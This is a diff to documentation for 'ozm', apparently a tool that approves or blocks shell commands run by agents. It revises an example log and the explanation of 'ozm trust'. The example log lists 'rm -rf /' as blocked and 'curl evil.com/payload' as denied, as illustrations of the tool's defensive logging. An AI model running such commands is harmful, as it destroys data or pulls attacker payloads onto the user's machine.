@@ -262,12 +262,14 @@ $ ozm log
 
 # Show last 5 entries
 $ ozm log -n 5
-2026-04-26 10:15:03  allowed  cmd  /Users/you/project  pytest
-2026-04-26 10:15:45  blocked  cmd  /Users/you/project  rm -rf /
-2026-04-26 10:16:12  allowed  run  /Users/you/project  /Users/you/project/deploy.sh
-2026-04-26 10:17:01  denied   cmd  /Users/you/project  curl evil.com/payload  # looks suspicious
-2026-04-26 10:18:30  allowed  cmd  /Users/you/project  docker compose up
+2026-04-26 10:15:03  cached     cmd  /Users/you/project  pytest
+2026-04-26 10:15:45  blocked    cmd  /Users/you/project  rm -rf /
+2026-04-26 10:16:12  clicked    run  /Users/you/project  /Users/you/project/deploy.sh
+2026-04-26 10:17:01  denied     cmd  /Users/you/project  curl evil.com/payload  # looks suspicious
+2026-04-26 10:18:30  config     cmd  /Users/you/project  docker compose up
 ```
+
+Actions: `clicked` (user approved), `cached` (hash matched), `config` (allowlist match), `denied`, `blocked`, `no-dialog` (GUI unavailable, command blocked).
 
 The `# comment` at the end is the user's feedback from the approval dialog.
 
@@ -308,7 +310,7 @@ All checks passed.
 
 ## ozm trust
 
-Explicitly trust the `.ozm.yaml` in the current project. ozm tracks a SHA-256 hash of each config file — if you enter a project with a new or modified `.ozm.yaml`, ozm will warn you before applying it.
+Activate the `.ozm.yaml` from the current project. This copies the in-repo config into `~/.ozm/projects/` where ozm actually reads it at runtime. The in-repo file is never read directly — this is a security boundary.
 
 ```
 ozm trust
@@ -318,15 +320,10 @@ ozm trust
 
 ```bash
 $ cd new-project
-$ ozm cmd pytest
-# ozm: new or modified config detected: /Users/you/new-project/.ozm.yaml
-#   allowed_commands:
-#   - pytest
-# ozm: trust this config? [y/N]
-
-# Or trust it explicitly:
 $ ozm trust
-ozm: trusted /Users/you/new-project/.ozm.yaml
+ozm: copied /Users/you/new-project/.ozm.yaml -> /Users/you/.ozm/projects/new-project-a1b2c3d4.yaml
 ```
 
-This prevents a cloned repo's `.ozm.yaml` from silently allowing commands you haven't reviewed.
+**Why this matters:** An agent (or a cloned repo) can edit `.ozm.yaml` freely, but the changes have no effect until a human explicitly runs `ozm trust`. This prevents a repo from silently adding allowlist entries.
+
+**Optional:** ozm works without any config — all commands simply go through the approval dialog or hash cache. Config is only needed to pre-approve or block specific patterns.
